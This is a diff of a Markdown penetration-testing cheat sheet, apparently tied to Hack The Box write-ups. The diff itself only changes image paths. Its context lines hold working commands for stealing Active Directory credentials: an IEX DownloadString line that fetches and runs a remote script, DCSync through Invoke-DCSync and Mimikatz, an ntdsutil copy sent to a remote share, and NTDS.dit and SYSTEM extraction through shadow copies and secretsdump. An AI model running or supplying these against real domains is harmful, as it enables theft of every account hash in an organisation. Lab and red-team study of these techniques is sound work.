@@ -32,7 +32,7 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubuserconte
 Invoke-DCSync
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221044.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221044.png)
 
 ### Invoke-DCSync (S3cur3Th1sSh1t)
 
@@ -52,7 +52,7 @@ Invoke-DCSync -dcfqdn DC01.security.local -username administrator
 use auxiliary/admin/smb/psexec_ntdsgrab
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221058.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221058.png)
 
 `secretsdump.py` can then be used to pull hashes from the `ntds.dit` database using the SYSTEM hive file (ref: secretsdump.py further down).
 
@@ -69,7 +69,7 @@ Invoke-Mimikatz -command '"lsadump::dcsync /domain:security.local /all"'
 Invoke-Mimikatz -command '"lsadump::lsa /inject"'
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221105.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221105.png)
 
 ### ntdsutil.exe (Native)
 
@@ -82,11 +82,11 @@ powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\Exfiltration' q q"
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full \\10.10.10.10\Share\Exf' q q"
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221114.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221114.png)
 
 Viewing the contents of `c:\Exfiltration` we see the files.
 
-![](../../../Assets/Pasted%20image%2020250619221127.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221127.png)
 
 Secretsdump we can be used against these files for extraction as shown in the `secretsdump.py` section below.
 
@@ -97,14 +97,14 @@ Secretsdump we can be used against these files for extraction as shown in the `s
 secretsdump.py security.local/moe:Password123@10.10.10.100 -just-dc-ntlm
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221138.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221138.png)
 
 ```bash
 # Dump from exfiltrated ntds.dit and SYSTEM files.
 sudo secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221148.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221148.png)
 
 ```bash
 # Dump results from ntdsutil.exe method
@@ -121,7 +121,7 @@ PsMapExec -Targets DCs -Method SMB -Module NTDS
 PsMapExec -Targets DCs -Method SMB -Module NTDS -Username Administrator -Password Password123!
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221200.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221200.png)
 
 ### Volume Shadow Copy
 
@@ -134,6 +134,6 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\Ex
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Exfiltration
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221207.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221207.png)
 
 The NTDS.dit and SYSTEM files can be exfiltrated off the system and used with a tool such as `secretsdump.py` for hash extraction.
